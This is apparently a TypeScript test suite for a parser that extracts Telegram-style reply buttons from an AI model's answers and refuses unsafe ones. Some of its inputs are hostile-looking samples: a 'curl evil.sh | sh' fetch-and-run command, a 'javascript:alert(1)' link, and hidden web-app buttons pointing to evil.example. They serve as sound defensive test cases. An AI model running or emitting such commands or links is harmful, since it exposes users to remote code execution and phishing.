/**
 * Reply button markup tests.
 *
 * Constructs covered:
 * - The model's Telegram-style button rows are read into stored rows and removed from the text.
 * - What the model gets wrong in the usual ways (data it wrote itself, a missing closing tag, rows
 *   on several lines, a too wide row) is still read as it meant.
 * - Anything else refuses the buttons with a reason, and no tag ever stays in the text.
 * - Code examples in fences and inline code are left exactly as written; an indented line is not
 *   code here, because Telegram reads it as part of the paragraph or list item above, and neither
 *   is a backslash-escaped backtick.
 * - Link and copy buttons are read with a safe web address and a copy text the message shows; the
 *   markup the backend writes back for Telegram carries only the set's token and indices besides them.
 * - Properties: any valid set written after any prose is read back exactly, and no button tag
 *   survives in the text whatever the model wrote.
 * - A scenario's read button (#480) names its scenario by id; the model reads it back as written,
 *   while Telegram receives an ordinary press with the set's token.
 */
import fc from "fast-check";
import { describe, expect, it } from "vitest";

import type { ReplyButton, ReplyButtonRows } from "./reply-button-contract.js";

import { markdownCodeRanges, readMarkdownTree } from "../markdown-syntax.js";
import { readReplyButtonMarkup, replyButtonMarkup } from "./reply-button-markup.js";

const TOKEN = "AbCdEfGhIjKlMnOpQrStUv";

describe("reading reply button markup", () => {
  it("takes a row at the end of an answer and leaves the question above it", () => {
    const reading = readReplyButtonMarkup([
      "Пицца «Маргарита» за 650 ₽, доставка к 19:00.",
      "",
      "Заказываем?",
      "",
      "<tg-button-row><tg-button style=\"success\">✅ Да</tg-button><tg-button style=\"danger\">❌ Нет</tg-button><tg-button style=\"primary\">✏️ Изменить</tg-button></tg-button-row>",
    ].join("\n"));

    expect(reading).toEqual({
      error: null,
      markdown: "Пицца «Маргарита» за 650 ₽, доставка к 19:00.\n\nЗаказываем?",
      rows: [[
        { color: "green", text: "✅ Да" },
        { color: "red", text: "❌ Нет" },
        { color: "blue", text: "✏️ Изменить" },
      ]],
    });
  });

  it("leaves an answer without buttons exactly as written", () => {
    const markdown = "Готово.\n\n\n```\n<b>как есть</b>\n```";
    expect(readReplyButtonMarkup(markdown)).toEqual({ error: null, markdown, rows: null });
  });

  it("reads rows written on several lines, the documentation's attributes and color names", () => {
    const reading = readReplyButtonMarkup([
      "Когда напомнить?",
      "",
      "<tg-button-row align=\"center\">",
      "  <tg-button type=\"callback_data\" data=\"later\" style=\"green\">Через час</tg-button>",
      "  <tg-button type=\"callback\" style=\"link\">Завтра</tg-button>",
      "</tg-button-row>",
      "<tg-button-row>",
      "  <tg-button style='red'>Не надо</tg-button>",
      "</tg-button-row>",
    ].join("\n"));

    expect(reading.error).toBeNull();
    expect(reading.markdown).toBe("Когда напомнить?");
    expect(reading.rows).toEqual([
      [{ color: "green", text: "Через час" }, { text: "Завтра" }],
      [{ color: "red", text: "Не надо" }],
    ]);
  });

  it("closes a row the model left open at the very end", () => {
    const reading = readReplyButtonMarkup("Берём?\n\n<tg-button-row><tg-button>Да</tg-button><tg-button>Нет</tg-button>");
    expect(reading).toEqual({ error: null, markdown: "Берём?", rows: [[{ text: "Да" }, { text: "Нет" }]] });
  });

  it("takes buttons written without a row as one row", () => {
    const reading = readReplyButtonMarkup("Берём?\n\n<tg-button>Да</tg-button> <tg-button>Нет</tg-button>");
    expect(reading).toEqual({ error: null, markdown: "Берём?", rows: [[{ text: "Да" }, { text: "Нет" }]] });
  });

  it("moves buttons beyond three in a row to the next row", () => {
    const labels = ["1", "2", "3", "4", "5"];
    const row = labels.map((label) => `<tg-button>${label}</tg-button>`).join("");
    const reading = readReplyButtonMarkup(`Сколько?\n\n<tg-button-row>${row}</tg-button-row>`);

    expect(reading.rows).toEqual([
      [{ text: "1" }, { text: "2" }, { text: "3" }],
      [{ text: "4" }, { text: "5" }],
    ]);
  });

  it("decodes entities and collapses the spacing of a label", () => {
    const reading = readReplyButtonMarkup("Кто?\n\n<tg-button-row><tg-button>\n  R&amp;D\n  отдел\n</tg-button></tg-button-row>");
    expect(reading.rows).toEqual([[{ text: "R&D отдел" }]]);
  });

  it("joins rows written apart into one set at the end", () => {
    const reading = readReplyButtonMarkup([
      "Первый вариант — пицца.",
      "<tg-button-row><tg-button>Пицца</tg-button></tg-button-row>",
      "Второй — суши.",
      "<tg-button-row><tg-button>Суши</tg-button></tg-button-row>",
    ].join("\n"));

    expect(reading.markdown).toBe("Первый вариант — пицца.\nВторой — суши.");
    expect(reading.rows).toEqual([[{ text: "Пицца" }], [{ text: "Суши" }]]);
  });

  it("reads buttons indented under a list item, which Telegram does not treat as code", () => {
    const reading = readReplyButtonMarkup("1. Пицца\n2. Суши\n    <tg-button-row><tg-button>Пицца</tg-button><tg-button>Суши</tg-button></tg-button-row>");

    expect(reading).toEqual({ error: null, markdown: "1. Пицца\n2. Суши", rows: [[{ text: "Пицца" }, { text: "Суши" }]] });
  });

  it.each([
    ["an indented line after a paragraph", "Смотрите:\n    <tg-button type=\"web_app\" url=\"https://evil.example\">Открыть</tg-button>"],
    ["an escaped backtick", "Смотрите: \\`<tg-button type=\"web_app\" url=\"https://evil.example\">Открыть</tg-button>\\`"],
  ])("refuses a link-like button hidden behind %s", (_case, markdown) => {
    const reading = readReplyButtonMarkup(markdown);

    expect(reading.rows).toBeNull();
    expect(reading.error).toEqual(expect.objectContaining({ code: "AGENT_REPLY_BUTTONS_INVALID" }));
    expect(reading.markdown).not.toMatch(/<\/?tg-button/u);
  });

  it("keeps the spacing of inline code on a line a tag was removed from", () => {
    const reading = readReplyButtonMarkup("Команда `ls  -la` <tg-button>Да</tg-button>");
    expect(reading.markdown).toBe("Команда `ls  -la`");
  });

  it("leaves button markup inside code untouched", () => {
    const markdown = [
      "Так пишется кнопка:",
      "",
      "```html",
      "<tg-button-row><tg-button>Да</tg-button></tg-button-row>",
      "```",
      "",
      "И строкой: `<tg-button>Нет</tg-button>`.",
    ].join("\n");

    expect(readReplyButtonMarkup(markdown)).toEqual({ error: null, markdown, rows: null });
  });

  it.each([
    ["a mini app button", "<tg-button-row><tg-button type=\"web_app\" url=\"https://example.com\">Открыть</tg-button></tg-button-row>", "type=\"web_app\" не поддерживается"],
    ["a login button", "<tg-button-row><tg-button type=\"login_url\" url=\"https://example.com\">Войти</tg-button></tg-button-row>", "не поддерживается"],
    ["a link without an address", "<tg-button-row><tg-button type=\"url\">Сайт</tg-button></tg-button-row>", "адрес http или https"],
    ["a Telegram app link", "<tg-button-row><tg-button type=\"url\" url=\"tg://resolve?domain=x\">Бот</tg-button></tg-button-row>", "адрес http или https"],
    ["a script link", "<tg-button-row><tg-button type=\"url\" url=\"javascript:alert(1)\">Сайт</tg-button></tg-button-row>", "адрес http или https"],
    ["a mail link", "<tg-button-row><tg-button type=\"url\" url=\"mailto:a@example.com\">Почта</tg-button></tg-button-row>", "адрес http или https"],
    ["a t.me link", "<tg-button-row><tg-button type=\"url\" url=\"https://t.me/somebot?start=x\">Бот</tg-button></tg-button-row>", "Telegram"],
    ["a telegram.me subdomain link", "<tg-button-row><tg-button type=\"url\" url=\"https://chat.telegram.me/x\">Чат</tg-button></tg-button-row>", "Telegram"],
    ["a copy button without its text", "<tg-button-row><tg-button type=\"copy_text\">Скопировать</tg-button></tg-button-row>", "от 1 до 256 символов"],
    ["a copy text over 256 characters", `<tg-button-row><tg-button type="copy_text" text="${"Вопрос".repeat(43)}">Скопировать</tg-button></tg-button-row>`, "от 1 до 256 символов"],
    ["a copy text the message does not show", "<tg-button-row><tg-button type=\"copy_text\" text=\"SECRET42\">Скопировать</tg-button></tg-button-row>", "должен стоять в тексте сообщения"],
    ["seven buttons", `<tg-button-row>${"1234567".split("").map((n) => `<tg-button>${n}</tg-button>`).join("")}</tg-button-row>`, "от 1 до 6 кнопок"],
    ["an empty row", "<tg-button-row></tg-button-row>", "от 1 до 6 кнопок"],
    ["a blank label", "<tg-button-row><tg-button>  </tg-button></tg-button-row>", "от 1 до 40 символов"],
    ["a long label", `<tg-button-row><tg-button>${"я".repeat(41)}</tg-button></tg-button-row>`, "от 1 до 40 символов"],
    ["markup in a label", "<tg-button-row><tg-button>*Да*</tg-button></tg-button-row>", "символов разметки"],
    ["a nested tag in a label", "<tg-button-row><tg-button><b>Да</b></tg-button></tg-button-row>", "символов разметки"],
    ["a repeated answer", "<tg-button-row><tg-button>Да</tg-button><tg-button>да</tg-button></tg-button-row>", "не должны повторяться"],
    ["text inside a row", "<tg-button-row>Выбери: <tg-button>Да</tg-button></tg-button-row>", "посторонний текст"],
    ["an unclosed button", "<tg-button-row><tg-button>Да</tg-button-row>", "не закрыта"],
    ["a stray closing tag", "Да</tg-button>", "не закрыта"],
  ])("refuses %s and removes every tag", (_case, markup, reason) => {
    const reading = readReplyButtonMarkup(`Вопрос?\n\n${markup}`);

    expect(reading.rows).toBeNull();
    expect(reading.error).toEqual(expect.objectContaining({
      code: "AGENT_REPLY_BUTTONS_INVALID",
      message: expect.stringContaining(reason),
    }));
    expect(reading.markdown).not.toMatch(/tg-button/u);
    expect(reading.markdown.startsWith("Вопрос?")).toBe(true);
  });

  it("reads link and copy buttons beside answer buttons, with decoded addresses and texts", () => {
    const reading = readReplyButtonMarkup([
      "Промокод `SUMMER25` и «скидка 10% & доставка».",
      "",
      "Заказываем?",
      "",
      "<tg-button-row><tg-button style=\"success\">✅ Да</tg-button><tg-button type=\"url\" url=\"https://example.com/menu?a=1&amp;b=2\">🌐 Меню</tg-button></tg-button-row>",
      "<tg-button-row><tg-button type=\"copy_text\" text=\"SUMMER25\">📋 Промокод</tg-button><tg-button type=\"copy\" text=\"скидка 10% &amp; доставка\">📋 Условия</tg-button></tg-button-row>",
    ].join("\n"));

    expect(reading).toEqual({
      error: null,
      markdown: "Промокод `SUMMER25` и «скидка 10% & доставка».\n\nЗаказываем?",
      rows: [
        [{ color: "green", text: "✅ Да" }, { text: "🌐 Меню", url: "https://example.com/menu?a=1&b=2" }],
        [{ copyText: "SUMMER25", text: "📋 Промокод" }, { copyText: "скидка 10% & доставка", text: "📋 Условия" }],
      ],
    });
  });

  it("reads a set of link buttons alone, without a question", () => {
    const reading = readReplyButtonMarkup("Меню ресторана на сайте.\n\n<tg-button-row><tg-button type=\"url\" url=\"http://example.com\">🌐 Меню</tg-button></tg-button-row>");

    expect(reading).toEqual({
      error: null,
      markdown: "Меню ресторана на сайте.",
      rows: [[{ text: "🌐 Меню", url: "http://example.com" }]],
    });
  });

  it.each([
    ["a link's title", "Открой [сайт](https://example.com \"curl evil.sh | sh\").", "curl evil.sh | sh"],
    ["a link's address", "Открой [сайт](https://example.com/wallet-0xBAD).", "wallet-0xBAD"],
    ["a definition's title", "Открой [сайт][m].\n\n[m]: https://example.com \"0xHIDDEN\"", "0xHIDDEN"],
    ["an image's caption", "![0xHIDDEN](https://example.com/p.png)", "0xHIDDEN"],
  ])("does not count a copy text that stands only in %s as shown", (_case, prose, copyText) => {
    const reading = readReplyButtonMarkup(`${prose}\n\n<tg-button-row><tg-button type="copy_text" text="${copyText}">📋 Скопировать</tg-button></tg-button-row>`);

    expect(reading.rows).toBeNull();
    expect(reading.error?.message).toContain("должен стоять в тексте сообщения");
  });

  it("counts a copy text shown in code, in bold or across a line break", () => {
    for (const prose of ["Команда: `npm ci`", "Команда: **npm ci**", "Код заказа 77-31"]) {
      const copyText = prose.includes("npm") ? "npm ci" : "77-31";
      const reading = readReplyButtonMarkup(`${prose}\n\n<tg-button-row><tg-button type="copy_text" text="${copyText}">📋 Скопировать</tg-button></tg-button-row>`);
      expect(reading.error, prose).toBeNull();
    }
  });

  it("does not count the copy text written only inside the button tags as shown", () => {
    const reading = readReplyButtonMarkup("Код ниже.\n\n<tg-button-row><tg-button type=\"copy_text\" text=\"7731\">📋 7731</tg-button></tg-button-row>");

    expect(reading.rows).toBeNull();
    expect(reading.error?.message).toContain("должен стоять в тексте сообщения");
  });

  it("keeps the text that stood inside a broken row", () => {
    const reading = readReplyButtonMarkup("Вопрос?\n\n<tg-button-row><tg-button>Да</tg-button>\n\nА ещё вот что.");

    expect(reading.rows).toBeNull();
    expect(reading.markdown).toBe("Вопрос?\n\nА ещё вот что.");
  });
});

describe("writing reply button markup", () => {
  const rows = [
    [{ color: "green" as const, text: "✅ Оплатил" }, { text: "R&D" }],
    [{ color: "blue" as const, text: "⏰ Через час" }],
  ];

  it("writes what the model reads back, one row per line", () => {
    expect(replyButtonMarkup(rows)).toBe([
      "<tg-button-row><tg-button style=\"success\">✅ Оплатил</tg-button><tg-button>R&amp;D</tg-button></tg-button-row>",
      "<tg-button-row><tg-button style=\"primary\">⏰ Через час</tg-button></tg-button-row>",
    ].join("\n"));
    expect(readReplyButtonMarkup(`Оплатил?\n\n${replyButtonMarkup(rows)}`).rows).toEqual(rows);
  });

  it("writes link and copy buttons with their escaped address and text, for the model and for Telegram", () => {
    const utility = [[
      { color: "green" as const, text: "✅ Да" },
      { text: "🌐 Меню", url: "https://example.com/?a=1&b=\"2\"" },
      { copyText: "say \"hi\" & <go>\nnow", text: "📋 Команда" },
    ]];

    expect(replyButtonMarkup(utility)).toBe(
      "<tg-button-row><tg-button style=\"success\">✅ Да</tg-button><tg-button type=\"url\" url=\"https://example.com/?a=1&amp;b=&quot;2&quot;\">🌐 Меню</tg-button>" +
      "<tg-button type=\"copy_text\" text=\"say &quot;hi&quot; &amp; &lt;go&gt;&#10;now\">📋 Команда</tg-button></tg-button-row>",
    );
    expect(replyButtonMarkup(utility, TOKEN)).toBe(
      `<tg-button-row><tg-button type="callback_data" data="rb:${TOKEN}:0" style="success">✅ Да</tg-button><tg-button type="url" url="https://example.com/?a=1&amp;b=&quot;2&quot;">🌐 Меню</tg-button>` +
      "<tg-button type=\"copy_text\" text=\"say &quot;hi&quot; &amp; &lt;go&gt;&#10;now\">📋 Команда</tg-button></tg-button-row>",
    );
  });

  it("numbers the buttons across rows for Telegram, within its 64-byte callback data", () => {
    const markup = replyButtonMarkup(rows, TOKEN);

    expect(markup).toBe([
      `<tg-button-row><tg-button type="callback_data" data="rb:${TOKEN}:0" style="success">✅ Оплатил</tg-button><tg-button type="callback_data" data="rb:${TOKEN}:1">R&amp;D</tg-button></tg-button-row>`,
      `<tg-button-row><tg-button type="callback_data" data="rb:${TOKEN}:2" style="primary">⏰ Через час</tg-button></tg-button-row>`,
    ].join("\n"));
    for (const [, data] of markup.matchAll(/data="([^"]+)"/gu)) {
      expect(Buffer.byteLength(data!)).toBeLessThanOrEqual(64);
    }
  });
});

// Labels as a person reads them: words of letters, digits, emoji and safe punctuation, one space
// between words; an ampersand is in the alphabet so escaping is exercised. Characters that build
// links, mentions and commands are left out; a long run of digits that reads as a phone number is
// the one rare case filtered away.
const LABEL_CHARACTER = fc.oneof(
  fc.constantFrom(..."абвгдеёжзийклмнопрстуфхцчшщъыьэюяАБВГДЕabcxyzXYZ0123456789,!?:;-()'\"«»%&"),
  fc.constantFrom("✅", "❌", "⏰", "✏️", "👍", "🍕"),
);
const LABEL = fc.array(fc.array(LABEL_CHARACTER, { maxLength: 8, minLength: 1 }).map((word) => word.join("")), {
  maxLength: 4,
  minLength: 1,
}).map((words) => words.join(" ")).filter((label) => Array.from(label).length <= 40 && !/\d[\d\s()-]{6,}\d/u.test(label));
const BUTTON_ROWS: fc.Arbitrary<ReplyButtonRows> = fc.tuple(
  fc.uniqueArray(fc.record({
    color: fc.constantFrom(undefined, "green", "red", "blue"),
    text: LABEL,
    url: fc.constantFrom(undefined, undefined, "https://example.com/a?b=1&c=\"2\"", "http://пример.рф/путь"),
  }), {
    maxLength: 6,
    minLength: 1,
    selector: (button) => button.text.toLowerCase(),
  }),
  fc.array(fc.integer({ max: 3, min: 1 }), { maxLength: 6, minLength: 6 }),
).map(([buttons, widths]) => {
  const rows: ReplyButton[][] = [];
  let next = 0;
  for (const width of widths) {
    if (next >= buttons.length) break;
    rows.push(buttons.slice(next, next + width).map(({ color, text, url }) => ({
      ...(color === undefined ? {} : { color }),
      text,
      ...(url === undefined ? {} : { url }),
    })));
    next += width;
  }
  return rows;
});
// Prose without code: no backticks, tildes or indented lines, which would rightly hide markup.
const PROSE = fc.array(
  fc.array(fc.constantFrom(..."Пицца заказ на вечер 650 ₽, доставка к 19:00?! (да) — \"нет\" & <b>x</b> * _ #".split(" ")), { maxLength: 8 })
    .map((words) => words.join(" ")),
  { maxLength: 5 },
).map((lines) => lines.join("\n"));
// What a model can write around buttons: whole tags, pieces of tags, labels, text and line breaks.
const MARKUP_PIECE = fc.constantFrom(
  "<tg-button-row>", "<tg-button-row align=\"center\">", "</tg-button-row>", "<tg-button>", "<tg-button style=\"success\">",
  "<tg-button type=\"url\" url=\"https://example.com\">", "</tg-button>", "<tg-button", "</tg-button", "<tg-", "button", "-row",
  "<", ">", "/", "Да", "Нет", "✅ Ок", "текст", " ", "    ", "\t", "\n", "\n\n", "&amp;", "\\", "\\`",
);

describe("a scenario's read button (#480)", () => {
  const ID = "0f398fc5-e589-4e66-bf52-8db8aa3f7251";

  it("reads the scenario it skips and removes the tag from the text", () => {
    const reading = readReplyButtonMarkup(`Задачи на сегодня: 4\n\n<tg-button-row><tg-button type="read" schedule="${ID.toUpperCase()}" style="success">✅ Задачи на день услышаны</tg-button></tg-button-row>`);
    expect(reading).toEqual({
      error: null,
      markdown: "Задачи на сегодня: 4",
      rows: [[{ color: "green", skipScheduleId: ID, text: "✅ Задачи на день услышаны" }]],
    });
  });

  it("refuses a read button without a scenario id", () => {
    const reading = readReplyButtonMarkup(`Готово?\n\n<tg-button type="read" schedule="tasks">✅ Да</tg-button>`);
    expect(reading.rows).toBeNull();
    expect(reading.error?.message).toContain("сценарий его id");
  });

  it("writes the scenario back for the model and a plain press for Telegram", () => {
    const rows: ReplyButtonRows = [[{ color: "green", skipScheduleId: ID, text: "✅ Задачи на день услышаны" }]];
    expect(replyButtonMarkup(rows)).toBe(`<tg-button-row><tg-button type="read" schedule="${ID}" style="success">✅ Задачи на день услышаны</tg-button></tg-button-row>`);
    expect(replyButtonMarkup(rows, TOKEN)).toBe(`<tg-button-row><tg-button type="callback_data" data="rb:${TOKEN}:0" style="success">✅ Задачи на день услышаны</tg-button></tg-button-row>`);
  });
});

describe("reply button markup properties", () => {
  it("reads back any valid set written after any prose, and leaves the prose as written", () => {
    fc.assert(fc.property(PROSE, BUTTON_ROWS, (prose, rows) => {
      const reading = readReplyButtonMarkup(`${prose}\n\n${replyButtonMarkup(rows)}`);

      expect(reading.error).toBeNull();
      expect(reading.rows).toEqual(rows);
      expect(reading.markdown).toBe(prose.trim());
    }), {
      examples: [
        ["", [[{ text: "Да" }]]],
        ["Оплатил?", [[{ color: "green", text: "✅ Оплатил" }, { text: "R&D" }], [{ color: "blue", text: "⏰ Через час" }]]],
      ],
    });
  });

  it("never leaves a button tag outside code, and refuses only with its own error", () => {
    fc.assert(fc.property(fc.array(MARKUP_PIECE, { maxLength: 40 }), (pieces) => {
      const reading = readReplyButtonMarkup(pieces.join(""));

      // A longer name such as `tg-buttonx` is another, unknown tag, not a button. Code, such as
      // a line indented four spaces at the start, shows its tags as text, as Telegram does.
      const code = markdownCodeRanges(readMarkdownTree(reading.markdown));
      for (const tag of reading.markdown.matchAll(/<\/?tg-button(?:-row)?(?![\w-])/gu)) {
        expect(code.some((range) => tag.index >= range.start && tag.index < range.end)).toBe(true);
      }
      if (reading.rows === null) {
        if (reading.error !== null) expect(reading.error.code).toBe("AGENT_REPLY_BUTTONS_INVALID");
      } else {
        expect(reading.error).toBeNull();
        expect(reading.rows.flat().length).toBeGreaterThan(0);
      }
    }), {
      examples: [
        [["<tg-but", "<tg-button>", "Да", "</tg-button>", "ton>"]],
        [["<", "<tg-button>", "Да", "</tg-button>", "tg-button>"]],
        [["<tg-button-row>", "\n", "Да", "</tg-button>"]],
        [["\t", "<tg-button-row>", "\n", "<tg-button-row>"]],
      ],
    });
  });
});
